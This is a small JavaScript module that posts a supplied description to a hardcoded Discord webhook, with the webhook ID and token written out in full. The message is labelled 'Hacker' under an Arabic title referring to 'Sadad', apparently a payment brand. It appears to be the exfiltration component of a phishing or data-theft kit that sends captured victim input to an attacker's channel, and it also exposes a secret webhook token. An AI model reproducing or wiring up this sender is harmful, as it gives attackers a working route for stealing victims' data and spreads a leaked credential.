import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324754098028937337/F8B9sk8XmV1RbwzI_Rl_diudky1JWr9BkNWxZKEw02DPkVo75UUvqDSs902WQhywRrg8",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
